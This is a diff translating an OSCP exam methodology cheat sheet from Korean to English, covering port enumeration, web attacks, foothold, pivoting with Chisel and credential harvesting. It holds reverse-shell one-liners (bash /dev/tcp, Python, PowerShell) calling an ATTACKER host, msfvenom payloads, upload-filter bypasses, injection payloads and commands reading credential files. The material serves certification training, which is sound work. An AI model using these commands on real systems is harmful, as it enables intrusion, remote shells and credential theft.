@@ -1,143 +1,143 @@
 ---
-title: "OSCP 방법론 총정리 (Methodology)"
+title: "OSCP Methodology Overview"
 date: 2026-06-20
 weight: 10
 draft: false
 tags: ["oscp", "cheatsheet"]
-summary: "시험 당일 처음부터 끝까지 흐름을 따라가는 마스터 체크리스트."
+summary: "A master checklist that follows the exam-day workflow from start to finish."
 ---
 
-시험 당일 처음부터 끝까지 흐름을 따라가는 마스터 체크리스트.
+A master checklist that follows the exam-day workflow from start to finish.
 
-- 출처: https://heretek.dev/oscp-cheatsheet/methodology/ (Jean Romero) — 재구성
-- 변수: `$TARGET` = 공격 대상, `$KALI` = 공격자(Kali) IP
+- Source: https://heretek.dev/oscp-cheatsheet/methodology/ (Jean Romero) — reconstructed
+- Variables: `$TARGET` = target host, `$KALI` = attacker (Kali) IP
 
-## 멘토 조언 — 패스워드에 ! 이 있으면 반드시 이스케이프
+## Mentor tip — always escape `!` in passwords
 
 ```bash
-# " ! " 가 들어간 패스워드는 반드시 \! 로 이스케이프한다.
-# ' ' 로 감싸도 ! 가 명령 실행에서 제대로 읽히지 않는다.
+# Passwords containing " ! " must be escaped as \!
+# Even wrapped in ' ', the ! is not read correctly when the command runs.
 
 nxc smb 10.10.10.10 -u offsec -p "Password1\!"
-# 'Password1!' 는 제대로 동작하지 않는다.
+# 'Password1!' does not work correctly.
 ```
 
-## 막혔을 때 긴급 대응표 (Emergency Quick-Reference)
+## Emergency quick-reference when stuck
 
-- 30분 동안 foothold 실패 → nmap 출력 다시 읽기. 모든 버전 검색. 기본 계정 시도. UDP 확인. API에 POST 시도. 페이지 소스의 숨겨진 경로·주석 확인.
-- 쉘은 있지만 privesc 막힘 → `dir C:\` / `Get-ChildItem C:\` / `ls /` 로 이상한 디렉터리 찾기. `netstat -ano` / `ss -tulnp` 로 localhost 서비스 확인. 홈 디렉터리 모든 파일 읽기. 보호된 파일 크랙. pspy64 실행(Linux). PS 히스토리 확인(Windows).
-- AD — 초기 creds 후 막힘 → 트랜스크립트 grep이 최우선: `smbclient //IP/share -c 'recurse ON'` 후 `ls` → `_.ps1/*.txt/*.log`에서 ConvertTo-SecureString, PSCredential grep. 비기본 SMB 공유 전부 읽기. 그다음 BloodHound, Kerberoast/AS-REP, creds 스프레이, ADCS, delegation.
-- 익스플로잇이 안 됨 → 아키텍처 확인(32/64비트). 코드 읽기. 하드코딩된 IP/포트/경로 수정. 크로스컴파일 시도. bad character 확인. msfvenom exe 대신 nc.exe 패턴 시도.
-- 넘어가야 할 때 → 한 박스에서 2시간 이상 붙잡고 있지 않는다. 잠깐 쉬고 새로운 시선으로 복귀. 70점이면 통과 — standalone 하나는 건너뛸 수 있다.
+- Foothold failing for 30 minutes → re-read the nmap output. Search every version. Try default accounts. Check UDP. Try POST on APIs. Check hidden paths and comments in page source.
+- Have a shell but stuck on privesc → look for odd directories with `dir C:\` / `Get-ChildItem C:\` / `ls /`. Check localhost services with `netstat -ano` / `ss -tulnp`. Read every file in home directories. Crack protected files. Run pspy64 (Linux). Check PS history (Windows).
+- AD — stuck after initial creds → transcript grep is the top priority: `smbclient //IP/share -c 'recurse ON'` then `ls` → grep `_.ps1/*.txt/*.log` for ConvertTo-SecureString and PSCredential. Read all non-default SMB shares. Then BloodHound, Kerberoast/AS-REP, password spraying, ADCS, delegation.
+- Exploit not working → check architecture (32/64-bit). Read the code. Fix hardcoded IP/port/path. Try cross-compiling. Check for bad characters. Try the nc.exe pattern instead of an msfvenom exe.
+- When to move on → don't spend more than 2 hours on one box. Take a break and come back with fresh eyes. 70 points is a pass — you can skip one standalone.
 
-## PHASE 0 — 시험 셋업 (첫 10분)
+## PHASE 0 — Exam setup (first 10 minutes)
 
 ```bash
 export ip=<TARGET_IP>
 script -a /home/kali/oscp/exam_log_$(date +%F).txt
 
-# 도구 HTTP 서버를 지금 바로 시작 — 별도 터미널 탭에서
-# (작업 디렉터리가 바뀌지 않게)
+# Start the tool HTTP server right now — in a separate terminal tab
+# (so the working directory doesn't change)
 python3 -m http.server 80 -d ~/Tools &
-# ~/Tools 에 준비: linpeas.sh, winpeas.exe, chisel, chisel.exe,
+# Prepare in ~/Tools: linpeas.sh, winpeas.exe, chisel, chisel.exe,
 #   nc.exe, SharpHound.exe, PowerView.ps1, pspy64, GodPotato.exe, PrintSpoofer64.exe
 
-# AD 세트 — DNS 및 시간 동기화
+# AD set — DNS and time sync
 sudo ntpdate <DC_IP>
-# nmap에서 나온 모든 이름(FQDN + 도메인 + 호스트명)을 한 줄로 /etc/hosts 추가
+# Add all names from nmap (FQDN + domain + hostname) to /etc/hosts on one line
 echo "<DC_IP> dc.domain.local domain.local dc" | sudo tee -a /etc/hosts
-# resolv.conf: 인터넷용 8.8.8.8 유지. DC는 /etc/hosts 에만.
+# resolv.conf: keep 8.8.8.8 for internet. DC goes only in /etc/hosts.
 echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf
 ```
 
-통과 조합 (70점 통과):
+Passing combinations (70 points to pass):
 
-- AD full(40) + standalone full(20) + standalone initial(10) = 70 통과
-- AD partial(30) + standalone full(40) x 2 = 70 통과
-- AD full(40) + standalone full(40) x 2 = 80 여유
+- AD full (40) + standalone full (20) + standalone initial (10) = 70 pass
+- AD partial (30) + standalone full (40) x 2 = 70 pass
+- AD full (40) + standalone full (40) x 2 = 80, with margin
 
-AD는 부분 점수 있음: 워크스테이션 플래그 10점, DC 20점.
+AD has partial credit: workstation flag 10 points, DC 20 points.
 
-시간 배분:
+Time budget:
 
-- 0–1시간: 전 머신 스캔. 스캔 병렬 실행. 결과 읽기. 공격 순서 계획.
-- 1–5시간: AD 세트(40점). BloodHound → Kerberoast → lateral movement → DC.
-- 5–9시간: standalone 1, 2.
-- 9–11시간: standalone 3 또는 막힌 박스 재도전.
-- 11–12시간: 접근이 살아있을 때 스크린샷 + 리포트 노트 시작.
-- 12–16시간: 계속 익스플로잇. 막힌 박스 사이 로테이션.
-- 16시간 이후: 정리. 스크린샷 전부 확보 확인. proof 플래그 전부 검증.
+- 0–1 hour: scan all machines. Run scans in parallel. Read results. Plan the attack order.
+- 1–5 hours: AD set (40 points). BloodHound → Kerberoast → lateral movement → DC.
+- 5–9 hours: standalone 1, 2.
+- 9–11 hours: standalone 3 or retry a stuck box.
+- 11–12 hours: while access is still alive, take screenshots + start report notes.
+- 12–16 hours: keep exploiting. Rotate between stuck boxes.
+- After 16 hours: wrap up. Confirm all screenshots are captured. Verify all proof flags.
 
-전략: AD 세트를 먼저(40점, 가장 효율적). 한 박스에 2시간 이상 X. 발견한 모든 creds → 즉시 전체 스프레이.
+Strategy: do the AD set first (40 points, most efficient). No more than 2 hours on one box. Immediately spray every credential you find across everything.
 
-리포트 메모: proof 플래그 스크린샷은 `whoami; hostname; ip a; cat proof.txt` (Linux) 또는 `whoami; hostname; ipconfig; type C:\Users\Administrator\Desktop\proof.txt` (Windows — `&&` 대신 세미콜론). 모든 단계를 기록 — 리포트가 pass/fail을 결정. 스크린샷은 나중이 아니라 진행 중에 찍는다.
+Report note: proof-flag screenshots use `whoami; hostname; ip a; cat proof.txt` (Linux) or `whoami; hostname; ipconfig; type C:\Users\Administrator\Desktop\proof.txt` (Windows — semicolons instead of `&&`). Record every step — the report decides pass/fail. Take screenshots during the work, not later.
 
 ## PHASE 1 — Enumeration
 
-### 1a. 포트 스캔 (3개 동시 실행)
+### 1a. Port scans (run 3 at the same time)
 
 ```bash
-# 터미널 1: 빠른 전체 TCP 스캔
+# Terminal 1: fast full TCP scan
 sudo nmap -Pn -p- --min-rate=1000 -T4 -oN fast_tcp.txt $ip
 
-# 터미널 2: 상위 20 UDP
+# Terminal 2: top 20 UDP
 sudo nmap -Pn -sU --top-ports=20 -oN udp_top20.txt $ip
 
-# 터미널 3: 정밀 스캔 (fast 스캔 끝난 후)
+# Terminal 3: targeted scan (after the fast scan finishes)
 ports=$(grep '^[0-9]' fast_tcp.txt | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')
 sudo nmap -A -Pn -sC -sV -p $ports -oA targeted $ip
 
-# 취약점 스캔 (수동 열거하는 동안 실행)
+# Vulnerability scan (run while doing manual enumeration)
 sudo nmap -sV -p $ports --script "vuln" $ip -oN vuln.txt
 ```
 
-### 1b. 포트별 명령
+### 1b. Per-port commands
 
-열린 포트 전부 순서대로 처리. `빈출` 표시 = 가장 흔한 foothold 벡터.
+Process every open port in order. Items marked `Common` = the most frequent foothold vectors.
 
-- 빈출 / 21 FTP: `ftp $ip` (anonymous:anonymous). 쓰기 가능 + 웹 루트 겹침 → 웹셸 업로드
-- 22 SSH: 버전 기록. 사용자명 확실할 때만 브루트포스. 키 발견 시 `ssh2john`
+- Common / 21 FTP: `ftp $ip` (anonymous:anonymous). Writable + overlaps the webroot → upload a webshell
+- 22 SSH: record the version. Brute-force only when the username is certain. If a key is found, `ssh2john`
 - 53 DNS: `dig AXFR @$ip <domain>`, `dnsrecon -d <domain> -n $ip -t std`
-- 빈출 / 80·443 HTTP: 아래 PHASE 2 Web으로
+- Common / 80·443 HTTP: see PHASE 2 Web
 - 88 Kerberos: `kerbrute userenum -d DOMAIN --dc $ip users.txt`
 - 110·143 POP/IMAP: `telnet $ip 110` — USER/PASS/LIST/RETR
-- 빈출 / 111·2049 NFS: `showmount -e $ip`, 마운트 후 no_root_squash 확인
+- Common / 111·2049 NFS: `showmount -e $ip`, after mounting check for no_root_squash
 - 135 MSRPC: `rpcclient -U "" -N $ip -c 'enumdomusers; netshareenumall'`
-- 빈출 / 139·445 SMB: `enum4linux-ng -A $ip`, `smbclient -L //$ip -N`, `smbmap -H $ip`, `nmap --script smb-vuln* -p 445 $ip`. 전부 다운로드: `smbclient //$ip/share -N -c 'recurse;prompt;mget *'`
-- 빈출 / 161 SNMP: `onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $ip` → `snmpwalk -c <string> -v2c $ip`. Windows OID — users `1.3.6.1.4.1.77.1.2.25`, processes `1.3.6.1.2.1.25.4.2.1.2`, software `1.3.6.1.2.1.25.6.3.1.2`, TCP ports `1.3.6.1.2.1.6.13.1.3`
-- 빈출 / 389·636 LDAP: `ldapsearch -x -H ldap://$ip -s base namingcontexts` → creds로 열거
-- 빈출 / 1433 MSSQL: `impacket-mssqlclient sa:password@$ip`, xp_cmdshell 시도
-- 3306 MySQL: `mysql -h $ip -u root`, 패스워드 없이 시도. evil-winrm 로컬: `.\\mysql.exe -u root -e "SHOW DATABASES;"` (`-e` 로 hanging 방지)
-- 5432 Postgres: `psql -h $ip -U postgres`, `COPY TO PROGRAM` 시도
-- 빈출 / 5985·5986 WinRM: `evil-winrm -i $ip -u user -p pass` (5986 = SSL, `-S` 추가)
-- 6379 Redis: `redis-cli -h $ip` — CONFIG GET dir, 웹셸 쓰기
+- Common / 139·445 SMB: `enum4linux-ng -A $ip`, `smbclient -L //$ip -N`, `smbmap -H $ip`, `nmap --script smb-vuln* -p 445 $ip`. Download everything: `smbclient //$ip/share -N -c 'recurse;prompt;mget *'`
+- Common / 161 SNMP: `onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $ip` → `snmpwalk -c <string> -v2c $ip`. Windows OIDs — users `1.3.6.1.4.1.77.1.2.25`, processes `1.3.6.1.2.1.25.4.2.1.2`, software `1.3.6.1.2.1.25.6.3.1.2`, TCP ports `1.3.6.1.2.1.6.13.1.3`
+- Common / 389·636 LDAP: `ldapsearch -x -H ldap://$ip -s base namingcontexts` → enumerate with creds
+- Common / 1433 MSSQL: `impacket-mssqlclient sa:password@$ip`, try xp_cmdshell
+- 3306 MySQL: `mysql -h $ip -u root`, try without a password. Local via evil-winrm: `.\\mysql.exe -u root -e "SHOW DATABASES;"` (`-e` prevents hanging)
+- 5432 Postgres: `psql -h $ip -U postgres`, try `COPY TO PROGRAM`
+- Common / 5985·5986 WinRM: `evil-winrm -i $ip -u user -p pass` (5986 = SSL, add `-S`)
+- 6379 Redis: `redis-cli -h $ip` — CONFIG GET dir, write a webshell
 - 3389 RDP: `xfreerdp /u:user /p:pass /v:$ip /cert:ignore +clipboard`
-- 빈출 / 8080·8443 대체 웹: 80/443과 동일. Tomcat(`/manager`에서 `tomcat:s3cret`), Jenkins(script console → Groovy shell), WebLogic 확인
+- Common / 8080·8443 alternate web: same as 80/443. Check Tomcat (`tomcat:s3cret` at `/manager`), Jenkins (script console → Groovy shell), WebLogic
 
 ```bash
 curl http://$ip:PORT/endpoint                # GET
-curl -d "" -X POST http://$ip:PORT/endpoint  # POST (content-length 추가)
+curl -d "" -X POST http://$ip:PORT/endpoint  # POST (add content-length)
 ```
 
 ## PHASE 2 — Web Attacks
 
-### Step 1 — 정찰 (병렬 실행)
+### Step 1 — Recon (run in parallel)
 
 ```bash
 feroxbuster -u http://$ip -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,asp,aspx,jsp,bak -C 404 -t 50
 gobuster dir -u http://$ip -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 50
 
-# cgi-bin 확인 (Shellshock!)
+# Check cgi-bin (Shellshock!)
 gobuster dir -u http://$ip/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x sh,pl,cgi -t 50
 
-# 가상 호스트 (도메인명 알 때)
+# Virtual hosts (when the domain name is known)
 ffuf -u http://$ip/ -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_size>
 
-# Nikto (백그라운드 — 느리지만 뭔가 찾아냄)
+# Nikto (background — slow but finds things)
 nikto -h http://$ip -o nikto.txt &
 ```
 
-수동으로 항상 확인: `robots.txt`, `sitemap.xml`, `.git/HEAD`, `web.config`, `.env`, 페이지 소스(주석, JS 파일, hidden 필드, 버전 번호)
+Always check manually: `robots.txt`, `sitemap.xml`, `.git/HEAD`, `web.config`, `.env`, and page source (comments, JS files, hidden fields, version numbers)
 
 ### Step 2 — CMS?
 
@@ -146,44 +146,44 @@ wpscan --url http://$ip --enumerate p --plugins-detection aggressive  # WordPres
 droopescan scan drupal -u http://$ip      # Drupal
 ```
 
-발견된 CMS는 → `searchsploit <CMS> <version>`
+For any CMS found → `searchsploit <CMS> <version>`
 
-### Step 3 — 기본 계정
+### Step 3 — Default accounts
 
-모든 로그인에 시도: `admin:admin`, `admin:password`, `admin:Password1`, `root:root`, `tomcat:s3cret`
+Try on every login: `admin:admin`, `admin:password`, `admin:Password1`, `root:root`, `tomcat:s3cret`
 
-### Step 4 — 파라미터 테스트
+### Step 4 — Parameter testing
 
-발견한 모든 입력/파라미터에:
+Against every input/parameter you find:
 
 - SQLi: `'`, `' OR 1=1-- -`, time-based `1' WAITFOR DELAY '0:0:5'-- -`
 - XSS: `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`
 - LFI: `../../../../etc/passwd`, `php://filter/convert.base64-encode/resource=index`
-- Command injection: `; id`, `| id`, `$(id)`, 백틱
-- SSTI: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>` — `49` 로 렌더되면 주입 가능
+- Command injection: `; id`, `| id`, `$(id)`, backticks
+- SSTI: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>` — if it renders as `49`, it's injectable
 
-### Step 5 — 파일 업로드?
+### Step 5 — File upload?
 
-업로드 폼 발견 시:
+If you find an upload form:
 
-- 스택에 맞는 웹셸 업로드 (`.php`, `.aspx`, `.jsp`)
-- 확장자 필터 우회: 이중 확장자(`shell.php.jpg`), 대소문자 혼용(`.pHp`), 대체 확장자(`.phtml`, `.php5`, `.phar`)
-- Content-Type 검사 우회: Burp에서 `Content-Type: image/png` 설정, 본문은 악성 그대로
-- 이미지 검증 통과: 유효한 매직 헤더 프리펜드(예: `GIF89a;`)
-- 저장 위치 확인(`/uploads/`, `/files/`) → 브라우징해서 실행
+- Upload a webshell matching the stack (`.php`, `.aspx`, `.jsp`)
+- Bypass extension filters: double extensions (`shell.php.jpg`), mixed case (`.pHp`), alternate extensions (`.phtml`, `.php5`, `.phar`)
+- Bypass Content-Type checks: set `Content-Type: image/png` in Burp, keep the body malicious
+- Pass image validation: prepend a valid magic header (e.g., `GIF89a;`)
+- Check the save location (`/uploads/`, `/files/`) → browse to it to execute
 
 ## PHASE 3 — Foothold
 
-1. 알려진 익스플로잇 — 버전 일치하는 `searchsploit` 결과? 코드 읽고 수정하고 실행
-2. 기본/취약 creds — 모든 로그인, DB, 관리 인터페이스에 시도했는가?
-3. 웹 익스플로잇 — Phase 2에서 SQLi, LFI, 업로드, 커맨드 인젝션 찾았는가?
-4. creds 재사용 — 어디서든 찾은 creds → SSH, WinRM, RDP, SMB 전부 시도
-5. 브루트포스(최후 수단) — 사용자명 확실할 때만: `hydra -l user -P rockyou.txt ssh://$ip -t 4`
+1. Known exploits — does a searchsploit result match the version? Read the code, modify it, run it
+2. Default/weak creds — tried on every login, DB, and admin interface?
+3. Web exploits — did Phase 2 find SQLi, LFI, upload, or command injection?
+4. Credential reuse — try any creds you found on SSH, WinRM, RDP, SMB
+5. Brute force (last resort) — only when the username is certain: `hydra -l user -P rockyou.txt ssh://$ip -t 4`
 
-리버스 쉘 셋업:
+Reverse shell setup:
 
 ```bash
-rlwrap nc -lvnp 443    # 443 포트 — 4444는 방화벽에 막히는 경우가 많다
+rlwrap nc -lvnp 443    # port 443 — 4444 is often blocked by firewalls
 ```
 
 ```bash
@@ -191,21 +191,21 @@ rlwrap nc -lvnp 443    # 443 포트 — 4444는 방화벽에 막히는 경우가
 bash -c 'bash -i >& /dev/tcp/ATTACKER/443 0>&1'
 # Python (Linux)
 python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
-# PowerShell (Windows — 파일 업로드 전에 명령 실행만 가능할 때)
+# PowerShell (Windows — when you can only run commands before uploading a file)
 powershell -nop -w hidden -c "$c=New-Object System.Net.Sockets.TCPClient('ATTACKER',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$t=$r+'PS '+(pwd).Path+'> ';$s.Write(([Text.Encoding]::ASCII.GetBytes($t)),0,$t.Length);$s.Flush()};$c.Close()"
-# msfvenom — 64비트 먼저
+# msfvenom — 64-bit first
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f elf -o shell.elf
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f exe -o shell.exe
-# 32비트 (타깃이 x86일 때 — Linux는 `file`, Windows는 `systeminfo`로 확인)
+# 32-bit (when the target is x86 — check with `file` on Linux, `systeminfo` on Windows)
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f elf -o shell32.elf
 msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f exe -o shell32.exe
 ```
 
-## PHASE 4 — Post-Exploitation (모든 쉘 확보 직후, 매번)
+## PHASE 4 — Post-Exploitation (immediately after every shell, every time)
 
-착지한 모든 머신에서 매번 전부 수행. 첫 번째 머신만 하는 게 아니다.
+Do all of this on every machine you land on, every time — not just the first machine.
 
-### Step 1 — 쉘 안정화
+### Step 1 — Stabilize the shell
 
 Linux:
 
@@ -218,18 +218,18 @@ export TERM=xterm-256color
 stty rows 50 cols 200
 ```
 
-Windows (nc.exe로 받은 raw cmd.exe 쉘):
+Windows (raw cmd.exe shell received via nc.exe):
 
 ```powershell
-# 타깃에서 cmd → PowerShell 전환:
+# On the target: switch cmd → PowerShell:
 powershell -ep bypass
 
-# 쉘이 계속 죽으면 — nc.exe로 새 콜백 (Step 2b에서 이미 업로드):
+# If the shell keeps dying — new callback with nc.exe (already uploaded in Step 2b):
 C:\Windows\Temp\nc.exe KALI_IP 443 -e cmd.exe
-# Kali의 다른 터미널에서: rlwrap nc -lvnp 443
+# In another terminal on Kali: rlwrap nc -lvnp 443
 ```
 
-### Step 2 — 식별 + 스크린샷
+### Step 2 — Identify + screenshot
 
 ```text
 # Linux                        # Windows
@@ -238,42 +238,42 @@ hostname                       hostname
 ip a                           ipconfig /all
 ```
 
-즉시 스크린샷. 시험 당일에는 나중에 잊는다.
+Screenshot immediately. On exam day you forget later.
 
-### Step 2b — 타깃으로 도구 업로드
+### Step 2b — Upload tools to the target
 
-HTTP 파일 서버는 Phase 0에서 이미 실행 중이어야 한다. 아니면: `cd ~/Tools && python3 -m http.server 80 &`
+The HTTP file server should already be running from Phase 0. If not: `cd ~/Tools && python3 -m http.server 80 &`
 
 ```bash
-# Linux 타깃으로 업로드
+# Upload to Linux target
 wget http://KALI/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
 wget http://KALI/chisel -O /tmp/chisel && chmod +x /tmp/chisel
 wget http://KALI/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64
 ```
 
 ```powershell
-# Windows 타깃으로 업로드
+# Upload to Windows target
 certutil -urlcache -f http://KALI/winpeas.exe C:\Windows\Temp\winpeas.exe
 certutil -urlcache -f http://KALI/chisel.exe C:\Windows\Temp\chisel.exe
 certutil -urlcache -f http://KALI/nc.exe C:\Windows\Temp\nc.exe
-# certutil 막혔을 때 대체:
+# Fallback if certutil is blocked:
 powershell -c "iwr http://KALI/winpeas.exe -OutFile C:\Windows\Temp\winpeas.exe"
-# evil-winrm 경우 (내장 업로드):
+# If using evil-winrm (built-in upload):
 upload /home/kali/Tools/winpeas.exe C:\Windows\Temp\winpeas.exe
 ```
 
-타깃에서 Kali로 파일 다운로드 (winpeas 결과, loot 등):
+Download files from the target to Kali (winpeas results, loot, etc.):
 
 ```text
-# 방법 1: evil-winrm 내장
+# Method 1: built into evil-winrm
 *Evil-WinRM* PS> download C:\Windows\Temp\winpeas.txt .
 
-# 방법 2: Kali에서 SMB 서버 (별도 터미널)
+# Method 2: SMB server on Kali (separate terminal)
 impacket-smbserver smb $(pwd) -smb2support
-# 타깃에서: copy C:\Windows\Temp\winpeas.txt \\KALI_IP\smb\winpeas.txt
+# On target: copy C:\Windows\Temp\winpeas.txt \\KALI_IP\smb\winpeas.txt
 ```
 
-### Step 3 — 플래그 획득
+### Step 3 — Grab the flags
 
 ```bash
 cat /home/*/local.txt && cat /root/proof.txt 2>/dev/null          # Linux
@@ -284,9 +284,9 @@ Get-ChildItem -Path C:\Users -Recurse -Filter local.txt -ErrorAction SilentlyCon
 Get-ChildItem -Path C:\Users -Recurse -Filter proof.txt -ErrorAction SilentlyContinue | Get-Content
 ```
 
-### Step 4 — 내부 네트워크 + 숨은 서비스 확인
+### Step 4 — Internal network + hidden services
 
-착지한 모든 머신에서 실행:
+Run on every machine you land on:
 
 ```text
 # LINUX                            # WINDOWS
@@ -296,86 +296,86 @@ arp -a                             arp -a
 ss -tulnp                          netstat -ano | findstr LISTENING
 ```
 
-출력을 읽고 세 가지를 확인한다.
+Read the output and check three things.
 
-### A) NIC이 두 개인가? → 피벗 필요
+### A) Two NICs? → pivoting needed
 
-`ip a`가 `eth0: 192.168.x.x` 와 `eth1: 172.16.x.x` 를 동시에 보여주면, 이 머신은 Kali가 닿지 않는 내부 네트워크를 볼 수 있다. 터널링 필요. Chisel 사용:
+If `ip a` shows both `eth0: 192.168.x.x` and `eth1: 172.16.x.x`, this machine can see an internal network Kali can't reach. Tunneling is needed. Using Chisel:
 
 ```bash
-# Kali 터미널 — Chisel 서버 시작
+# Kali terminal — start the Chisel server
 ./chisel server -p 9999 --reverse
 
-# Chisel 바이너리는 Step 2b에서 타깃에 이미 있어야 한다.
-# 없으면: 80 포트 python3 HTTP 서버에서 다운로드.
+# The Chisel binary must already be on the target from Step 2b.
+# If not: download it from the python3 HTTP server on port 80.
 
-# 침투한 머신에서 — 콜백 연결
+# On the compromised machine — connect back
 # Linux:
 ./chisel client KALI_IP:9999 R:socks
 # Windows:
 .\chisel.exe client KALI_IP:9999 R:socks
 
-# Kali의 /etc/proxychains4.conf — 마지막 줄 변경:
+# Kali's /etc/proxychains4.conf — change the last line:
 # socks5 127.0.0.1 1080
 
-# 이제 Kali 도구 전부 터널을 통해 동작:
+# Now every Kali tool works through the tunnel:
 proxychains -q nmap -sT -Pn -p 80,445,5985,3389 INTERNAL_IP
 proxychains -q curl http://INTERNAL_IP
 proxychains -q evil-winrm -i INTERNAL_IP -u USER -p PASS
 proxychains -q smbclient -L //INTERNAL_IP -U USER
 ```
 
-터널이 열리면 → PHASE 1로 돌아가 새 서브넷을 열거한다.
+Once the tunnel is open → return to PHASE 1 and enumerate the new subnet.
 
-### B) 127.0.0.1 에서만 리스닝하는 서비스가 있는가? → 포트 포워드
+### B) Is a service listening only on 127.0.0.1? → port forward
 
-`netstat -ano`가 `127.0.0.1:8080 LISTENING` 을 보여주면 이 서비스는 이 머신에서만 접근 가능. 그 포트를 Kali로 포워드. Chisel (A와 같은 도구, 문법만 다름):
+If `netstat -ano` shows `127.0.0.1:8080 LISTENING`, the service is only reachable from this machine. Forward that port to Kali. Chisel (same tool as A, different syntax):
 
 ```bash
-# Chisel 서버는 A에서 이미 실행 중이어야 한다. 없으면:
+# The Chisel server must already be running from A. If not:
 # ./chisel server -p 9999 --reverse
 
-# 타깃에서 — chisel 바이너리는 Step 2b에서 이미 있음.
-# TIP: 하나의 클라이언트 연결에 SOCKS + 포트 포워드를 합칠 수 있다:
+# On target — the chisel binary is already there from Step 2b.
+# TIP: you can combine SOCKS + port forward in a single client connection:
 # ./chisel client KALI_IP:9999 R:socks R:9090:127.0.0.1:8080
-# 타깃의 localhost:8080 → Kali의 localhost:9090
+# target localhost:8080 → Kali localhost:9090
 .\chisel.exe client KALI_IP:9999 R:9090:127.0.0.1:8080
 # Linux: ./chisel client KALI_IP:9999 R:9090:127.0.0.1:8080
 
-# Kali에서 포워드된 서비스 접근
+# Access the forwarded service from Kali
 curl http://127.0.0.1:9090
-# 또는 브라우저로: http://127.0.0.1:9090
+# or in a browser: http://127.0.0.1:9090
 ```
 
-- Chisel은 업로드하는 단일 바이너리. 타깃에 SSH나 Socat이 필요 없다.
-- 여러 포트 동시 포워드: `R:9090:127.0.0.1:8080 R:9091:127.0.0.1:3306`
-- 8080, 9090은 netstat에서 발견한 포트로 바꿔 쓴다.
+- Chisel is a single binary you upload. No SSH or Socat is needed on the target.
+- Forward multiple ports at once: `R:9090:127.0.0.1:8080 R:9091:127.0.0.1:3306`
+- Replace 8080 and 9090 with the ports you found in netstat.
 
-조사할 가치가 있는 흔한 localhost 서비스: 80/8080(웹 앱), 1433(MSSQL), 3306(MySQL), 5432(Postgres).
+Common localhost services worth investigating: 80/8080 (web apps), 1433 (MSSQL), 3306 (MySQL), 5432 (Postgres).
 
-터널링 전에 타깃에서 직접 상호작용을 먼저 시도:
+Try direct interaction on the target before tunneling:
 
 ```powershell
-# MySQL (C:\xampp\mysql\bin 등 mysql.exe 위치에서)
+# MySQL (from the directory containing mysql.exe, e.g., C:\xampp\mysql\bin)
 .\mysql.exe -u root --password=""
 .\mysql.exe -u root -e "SHOW DATABASES;"
 .\mysql.exe -u root -e "USE dbname; SELECT * FROM users;"
-# Evil-WinRM은 인터랙티브 프롬프트에서 hang — 항상 -e 플래그
+# Evil-WinRM hangs at the interactive prompt — always use the -e flag
 
-# 알 수 없는 포트의 프로세스 식별 (admin 불필요)
+# Identify a process on an unknown port (no admin needed)
 Get-Process -Id <PID> | Select-Object Name,Path
-# 모든 포트를 한 번에 매핑:
+# Map all ports at once:
 Get-NetTCPConnection -State Listen | Select-Object LocalAddress,LocalPort,OwningProcess,@{Name='Process';Expression={(Get-Process -Id $_.OwningProcess).Name}} | Sort-Object LocalPort
 ```
 
-### C) 둘 다 아니면
+### C) Neither?
 
-Step 5로 진행.
+Proceed to Step 5.
 
-### Step 5 — creds 수확 + 파일시스템 loot + creds 표에 추가
+### Step 5 — Harvest creds + filesystem loot + add to the creds table
 
 ```bash
-# Linux: bash history, config 파일, env vars, .git 저장소
+# Linux: bash history, config files, env vars, .git repositories
 cat ~/.bash_history
 env | grep -i pass
 find / -name ".git" -type d 2>/dev/null
@@ -383,201 +383,201 @@ grep -ri 'password' /var/www/ /opt/ /home/ 2>/dev/null
 ```
 
 ```powershell
-# Windows — CMD와 PS 양쪽에서 동작:
+# Windows — works in both CMD and PS:
 whoami /all
 cmdkey /list
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 netstat -ano | findstr LISTENING
 
-# CMD 전용 (프롬프트가 C:\> 일 때):
+# CMD only (when the prompt is C:\>):
 type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 type C:\inetpub\wwwroot\web.config 2>nul
 type C:\Windows\Panther\unattend.xml 2>nul
 
-# PS 전용 (프롬프트가 PS C:\> 일 때):
+# PS only (when the prompt is PS C:\>):
 Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -EA SilentlyContinue
 Get-Content C:\inetpub\wwwroot\web.config -EA SilentlyContinue
 Get-Content C:\Windows\Panther\unattend.xml -EA SilentlyContinue
 Get-ChildItem -Path C:\ -Recurse -Filter *.kdbx -EA SilentlyContinue | Select FullName
 
-# 숨은 AppData — PS 전용 (dir 로는 안 보이고 WinPEAS도 놓친다):
+# Hidden AppData — PS only (not visible via dir, and WinPEAS misses it):
 Get-ChildItem -Path C:\Users\*\AppData -Recurse -Include *.xml,*.config,*.ini,*.txt,*.settings -Force -EA SilentlyContinue | Select-String -Pattern "password|credential|passwd" -List | Select Path
